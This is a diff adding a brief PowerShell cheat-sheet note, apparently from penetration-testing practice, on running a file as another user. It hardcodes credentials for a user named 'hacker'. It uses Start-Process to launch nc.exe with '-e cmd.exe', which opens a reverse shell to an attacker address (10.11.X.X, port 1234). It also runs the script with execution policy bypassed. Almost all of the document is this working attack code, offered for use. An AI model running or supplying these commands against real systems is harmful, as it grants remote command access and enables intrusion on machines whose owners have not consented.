@@ -1,0 +1,10 @@
+Run file as another user with powershell.
+
+$username = 'hacker'
+$password = 'hacker123'
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+Start-Process -FilePath C:\XXX\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-nc","-nv","10.11.X.X","1234","-e","cmd.exe") -WorkingDirectory C:\XXX
+
+
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File runas.ps1
